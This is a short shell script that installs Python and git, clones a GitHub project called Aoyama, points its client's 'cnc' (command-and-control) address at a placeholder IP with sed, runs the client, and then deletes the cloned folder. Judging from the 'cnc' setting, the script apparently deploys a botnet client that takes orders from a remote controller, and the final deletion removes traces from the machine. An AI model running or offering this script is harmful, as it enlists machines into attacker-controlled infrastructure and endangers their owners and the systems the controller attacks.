yum install -y python3
yum install -y git
git clone https://github.com/Leeon123/Aoyama.git
cd Aoyama/
sed -i "s/cnc                  = \"127.0.0.1\"/cnc                  = \"xxxx.xxxx.xxxx.xxxx\"/g" client.py
python3 client.py
cd -
rm -rf Aoyama/